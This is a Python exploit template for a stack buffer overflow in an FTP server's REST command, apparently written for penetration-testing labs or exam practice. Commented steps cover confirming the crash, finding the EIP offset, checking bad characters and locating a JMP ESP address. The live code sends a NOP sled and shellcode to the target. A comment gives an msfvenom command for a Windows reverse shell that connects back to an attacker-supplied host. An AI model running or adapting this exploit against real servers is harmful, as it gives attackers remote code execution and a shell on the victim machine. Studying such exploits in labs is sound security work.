#!/usr/bin/python

import socket
import sys
import subprocess
from time import sleep

TARGET = "xxx.xxx.xxx.xxx"
PORT = 21
PATH = '' # if required

CRASH_LEN = 300
OVERFLOW_LEN = 247
JMP_ESP = '\xD9\x72\x64\x77'
NOP_SLED = "\x90" * 32

send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))
run_proc = lambda cmd_list : str(subprocess.check_output(cmd_list)).strip()

# 1. Confirm crash 
# payload = "A" * CRASH_LEN

# 2. Create pattern and get offset/OVERFLOW_LEN
# payload = run_proc(['python', 'pattern.py', '-l', str(CRASH_LEN)])

# 3. Confirm EIP Overwrite
# payload = "A" * OVERFLOW_LEN + "B" * 4 + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)

# 4. Confirm bad characters
# bad_chars = run_proc(['python', 'bad_chars.py'])
# payload = "A" * OVERFLOW_LEN + "B" * 4 + bad_chars + "C" * (CRASH_LEN - OVERFLOW_LEN - 4 - len(bad_chars))

# 5. Get JMP_ESP
# !mona modules
# nasm_shell: jmp esp
# !mona find -s "\xff\xe4" -m ???.dll

# 4. Confirm JMP_ESP redirection
# payload = "A" * OVERFLOW_LEN + JMP_ESP + "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP))

# --- Final ---
# EXAMPLE: msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=1337 EXITFUNC=thread -b "\x00\x0a\x0d\x20\x7b" -f python -a x86

buf =  ""
...
...

payload =  buf
junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(payload) - len(NOP_SLED))
payload = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + payload + junk

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.recv(2000)
    send(s, 'USER', 'test')
    s.recv(2000)
    send(s, 'PASS ', 'test')
    s.recv(2000)
    send(s, 'REST', payload)
    s.close()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.recv(2000)
    sleep(1)
    s.close()
except Exception as e:
    print("DEBUG INFO: {}".format(e))
    sys.exit()
